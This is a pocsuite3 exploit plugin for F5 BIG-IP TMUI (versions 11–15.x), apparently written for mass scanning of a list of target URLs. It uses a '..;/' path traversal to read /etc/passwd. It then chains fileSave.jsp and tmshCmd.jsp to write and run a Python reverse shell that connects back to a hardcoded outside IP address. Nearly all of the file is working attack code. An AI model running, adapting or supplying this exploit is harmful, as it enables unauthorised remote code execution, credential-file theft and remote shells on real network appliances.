from pocsuite3.api import PluginBase,Output,POCBase
from urllib.parse import urljoin
from pocsuite3.api import PLUGIN_TYPE,REVERSE_PAYLOAD
from pocsuite3.api import logger,requests,get_listener_ip,get_listener_port
from pocsuite3.api import register_poc
import json


class F5_BIGIP(POCBase):
    category = PLUGIN_TYPE.POCS
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    author = 'srat1999' #  PoC作者的大名
    vulDate = '2020-7-9' #漏洞公开的时间,不知道就写今天
    createDate = '2020-7-9'# 编写 PoC 的日期
    updateDate = '2020-7-9'# PoC 更新的时间,默认和编写时间一样
    name = 'F5 BIGIP 任意文件读取+rce'# PoC 名称
    # appPowerLink = 'https://www.drupal.org/'# 漏洞厂商主页地址
    appName = 'F5_BIGIP'# 漏洞应用名称
    appVersion = '11-15.x'# 漏洞影响版本
    # vulType = 'SQL Injection'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        python cli.py -r pocs/F5-BIGIP.py --url-file urls.txt --threads 10
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
        # pocDesc = ''' '''
    def init(self):
        pass


    def _verify(self):

        result = {}
        path = "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
        url = urljoin(self.url,path)

        try:
            resp = requests.get(url,timeout=5)
            content = resp.text
            if "root" in content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
        except Exception as e:
            logger.warning(e)

        return self.parse_output(result)

    def _shell(self):
        cmd = REVERSE_PAYLOAD.PYTHON.format("129.211.73.107",get_listener_port())
        url = self.url
        file = "fe90dhsudf0bca5edee0deaced"
        self.tmshCmd_exit(url,file,cmd)

    def tmshCmd_exit(self,url,file,cmd):
        tmshCmd_url = url + "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash"
        # proxies = {"http":"http://127.0.0.1:1080","https":"https://127.0.0.1:1080"}
        r = requests.get(tmshCmd_url,verify=False,allow_redirects=False)
        # r = requests.get(tmshCmd_url,verify=False,allow_redirects=False,proxies=proxies)

        response_str = json.dumps(r.headers.__dict__['_store'])
        # print type(response_str)
        # print response_str
        if r.status_code == 200 and 'tmui' in response_str:
            # print tmshCmd_url
            logger.info("[+] tmshCmd.jsp Exit!")
            logger.info("[+] create cli alias private list command bash \n")
            # cmd = 'whoami'
            self.upload_exit(url,file,cmd)
        else:
            logger.error("[+] tmshCmd.jsp No Exit!\n")

    def upload_exit(self,url,file,cmd):
        fileSave_url = url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/%s&content="%file + cmd
        r = requests.get(fileSave_url,verify=False,allow_redirects=False)
        response_str = json.dumps(r.headers.__dict__['_store'])
        if r.status_code == 200 and 'tmui' in response_str:
            # print fileSave_url
            logger.info("[+] fileSave.jsp Exit!\n")
            self.list_command(url,file)
        else:
            logger.error("[+] fileSave.jsp No Exit!\n")

    def list_command(self,url,file):
        rce_url = url + "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/%s" % file
        # proxies = {"http":"http://127.0.0.1:1080","https":"https://127.0.0.1:8080"}
        r = requests.get(rce_url,verify=False,allow_redirects=False)
        # r = requests.get(rce_url,verify=False,allow_redirects=False,proxies=proxies)
        response_str = json.dumps(r.headers.__dict__['_store'])
        # print len(r.content)
        if r.status_code == 200 and 'tmui' in response_str:
            if len(r.content) > 33:
                # print rce_url
                logger.info("[+] Command Successfull !\n")
        else:
            logger.error("[+] Command Failed !\n")



    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(F5_BIGIP)
